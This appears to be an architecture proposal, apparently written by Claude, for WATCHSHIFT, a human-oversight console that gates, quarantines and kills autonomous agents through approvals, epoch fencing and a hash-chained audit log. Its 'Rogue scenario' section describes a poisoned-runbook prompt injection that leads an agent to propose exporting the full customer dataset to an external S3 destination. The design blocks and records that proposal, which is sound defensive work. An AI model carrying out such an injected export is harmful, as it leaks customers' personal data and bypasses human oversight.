# Architecture A (Claude, written before reading Codex's Architecture B)

## Concept
An operations console where a human "holds the watch" over a fleet of autonomous agents. The metaphor is a ship's
officer of the watch / air-traffic control: agents fly themselves, but every risky manoeuvre needs a clearance, and the
controller can hold, ground or remove any agent at any moment. The UI is organised around the operator's three
questions: *What is happening? What needs me? What went wrong and can I prove it?*

Primary workflow: Start demo -> fleet works on its own -> approval card appears -> inspect evidence -> approve/deny ->
see the consequence in the timeline -> rogue proposal is auto-blocked and the agent auto-quarantined -> kill -> replay
the last N steps -> export a hash-chained audit file.

## Names
| Name | Tagline | Notes |
|---|---|---|
| WATCHSHIFT | Agents act. Humans hold the watch. | Naval "watch" = accountable human on duty while automation runs. No software collision found in a web search (2026-11-12); closest: Watchsmith (watch faces). |
| CLEARANCE | No agent acts without it. | Strongest metaphor, but REJECTED: JetStream Clearance and an open-source "Clearance" agent-approval layer already exist in this exact category. |
| TRACON | Approach control for agents. | FAA term (Terminal Radar Approach Control); generic, hard to pronounce for non-aviation judges. |

## Runtime model
- One Node 24 process. A **workspace** = one tenant (one visitor session), with two **teams** (Engineering,
  Customer Ops) and three agents. All state is event-sourced: `state = fold(events)`.
- Each agent has a task list and a deterministic **planner** that reads the simulated world (not a script of UI
  frames). Planner output = an `ActionProposal {tool, params, rationale, evidence, tokens}`; denials, budget limits
  and world changes alter what it proposes next.
- Step lifecycle (every arrow is a persisted event):
  `StepPlanned -> ActionProposed -> PolicyEvaluated -> (ApprovalRequested -> ApprovalGranted|Denied|Expired|Revoked)
   -> ActionDispatched -> [simulated latency] -> commit gate -> ActionCompleted (+effect row) | EffectAborted`.
- **Commit gate** is the only place a simulated tool mutates the world. Inside one DB transaction it checks: process
  owner epoch, agent status RUNNING, agent epoch == dispatch epoch, approval (when required) granted + unused + same
  binding hash, budget. Effects carry an idempotent `opId` with a UNIQUE constraint.
- Interruptible boundaries: before planning, before dispatch, and at commit (the in-flight latency window).

## Invariants (testable)
1. No effect without a PolicyEvaluated=allow, or an ApprovalGranted whose binding hash =
   sha256(tool, canonical params, policy version, agent epoch, task, step) matches the dispatched action.
2. Pause, quarantine, kill and restart-recovery bump the agent epoch; any approval or dispatch bound to an older epoch
   is rejected at the commit gate. Kill is terminal.
3. An effect committed before a kill is reported as committed; kill never claims to reverse it.
4. Agents can only append agent-class events (StepPlanned, ActionProposed, ...). Approval/command events can only come
   from the operator command handler. Agent rationale is never read by the policy engine.
5. Every command is authorised server-side: operator team must own the agent; cross-team attempts are rejected AND
   logged as `AccessDenied`.
6. Duplicate commands (same idempotency key / same approval twice) produce exactly one effect.
7. Each workspace's events form a SHA-256 hash chain; exports are verifiable offline.
8. Every query is keyed by workspace id from an HttpOnly cookie; no API takes a workspace id from the client.

## Rogue scenario
InfraOps' task is "investigate rising infra cost" (capabilities: read metrics, scale within budget). Trigger injects a
recorded "poisoned runbook" observation into its input; the planner, following it, proposes
`data.export(dataset=customers_full, dest=s3://diag-snapshots-7f3a.example.net)` labelled "routine diagnostic
snapshot". Policy: tool not granted + PII dataset + destination not allow-listed -> BLOCK, `RogueBehaviorDetected`,
auto-quarantine (epoch bump, approvals revoked). Operator sees evidence, kills. A "stale worker retry" button replays
the blocked dispatch with the old epoch through the real commit gate -> `Fenced`. **Negative control**: the same
proposal is run through an unguarded executor against a cloned world; it records a simulated breach (N synthetic rows
at the external destination). Tests assert governed world has 0 exported rows, baseline has N.

## Persistence / replay
Tables: `workspaces`, `events(ws, seq, agent, task, step, type, actor, body, prev_hash, hash)`, `effects(ws, op_id
UNIQUE, ...)`, `owner(epoch)`. SQLite (node:sqlite) locally/tests, PostgreSQL hosted; same 5-method store contract.
Replay = group the agent's events by step for the last N steps and re-fold state at each step boundary; the response
carries the hash range so the UI can show "verified against chain".

## Cost honesty
Tokens are SIMULATED per step (deterministic from the proposal size); cost = tokens x a stated list price and labelled
"estimated, simulated usage". Per-task budget is enforced at the commit gate (BudgetExceeded -> BLOCKED; operator can
raise budget).

## Risks
Render spin-down (restart recovery + replay from DB), SSE through proxy (heartbeats, Last-Event-ID resume), visitor
sprawl (TTL + cap + rate limits), kill/commit race (single-writer per workspace mutex + epoch at commit),
time pressure (one service, no frameworks beyond React).
